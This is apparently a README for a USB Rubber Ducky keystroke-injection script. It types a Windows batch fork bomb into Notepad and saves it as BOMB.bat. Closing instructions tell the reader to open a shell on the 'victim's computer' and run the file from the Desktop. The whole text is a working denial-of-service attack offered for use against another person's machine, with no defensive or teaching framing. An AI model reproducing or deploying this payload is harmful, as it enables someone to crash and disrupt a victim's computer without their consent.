# Rubber-Ducky-Forkbomb-2.0-WIN-10
An updated Forkbomb Script

DELAY 500
GUI r
DELAY 200
STRING notepad
DELAY 200
ENTER
DELAY 200
STRING :s
ENTER
STRING start %0
ENTER
STRING goto :s

DELAY 300
CONTROL s
DELAY 700
STRING BOMB.bat
DELAY 200
ENTER
DELAY 200
ALT F4
DELAY 200

---> After you ran the script 
   -> Open shell on your victim's computer ant type in:
   -> cd /Users/type_in_victims_name/Desktop
   -> to check if file on desktop type in : dir
   -> Type in: BOMB.bat     to execute the file
